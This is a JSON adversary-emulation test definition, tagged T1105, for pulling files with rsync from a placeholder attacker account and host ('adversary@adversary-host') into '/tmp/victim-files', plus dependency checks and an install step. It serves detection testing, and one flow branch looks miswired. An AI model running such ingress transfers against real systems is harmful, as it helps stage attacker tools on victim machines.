{
  "id": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
  "name": "rsync remote file copy (pull)",
  "description": "Utilize rsync to perform a remote file copy (pull)\n",
  "platforms": [
    "linux",
    "darwin"
  ],
  "steps": [
    {
      "id": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314",
      "type": "execute-command",
      "data": {
        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
      "name": "Check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "cb5cf174-8496-4743-8902-13f8322dfc0c",
      "name": "Resolve dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "c511c3fb-46d1-40b0-b743-b6be18dfc606",
      "name": "Re-check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
      "p": "on-success",
      "o": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314"
    },
    {
      "s": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
      "p": "on-failure",
      "o": "cb5cf174-8496-4743-8902-13f8322dfc0c"
    },
    {
      "s": "cb5cf174-8496-4743-8902-13f8322dfc0c",
      "p": "on-success",
      "o": "c511c3fb-46d1-40b0-b743-b6be18dfc606"
    },
    {
      "s": "c511c3fb-46d1-40b0-b743-b6be18dfc606",
      "p": "on-failure",
      "o": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314"
    }
  ],
  "tags": [
    "T1105"
  ],
  "input_arguments": [
    {
      "name": "local_path",
      "type": "path",
      "description": "Local path to receive rsync",
      "value": "/tmp/victim-files"
    },
    {
      "name": "username",
      "type": "string",
      "description": "User account to authenticate on remote host",
      "value": "adversary"
    },
    {
      "name": "remote_path",
      "type": "path",
      "description": "Path of folder to copy",
      "value": "/tmp/adversary-rsync/"
    },
    {
      "name": "remote_host",
      "type": "string",
      "description": "Remote host to copy from",
      "value": "adversary-host"
    }
  ]
